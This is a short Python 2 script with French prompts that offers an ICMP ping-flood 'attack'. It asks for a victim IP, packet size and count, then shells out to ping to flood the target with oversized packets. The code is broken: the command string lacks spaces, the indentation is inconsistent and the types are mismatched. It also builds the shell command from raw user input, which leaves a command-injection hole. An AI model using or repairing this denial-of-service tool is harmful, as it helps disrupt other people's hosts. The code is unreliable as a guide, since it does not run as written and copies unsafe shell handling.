import os
import sys 

import time



def icmp_startattack():

    hostip = raw_input("ip de la victime")
  
    ippacketData = input("entrez la taille du paquet")
    number = input("entrez le nombre de paquet")
    # recommended size 65500 which is max available for ip packet 
    
	
    print ("Attaque de la cible en cours") 
   
    #    t = time.time()
	os.system("ping" + hostip + "-l" + ippacketData + "-n" + number)
	

        
    # os command to start attack 
    # where n points to time b/w per echo request and reply 
    # and n points to the number of packets with which every icmp request is to be sent to the h

	

icmp_startattack()  # called the main attack execution function 

print "attaque finis"
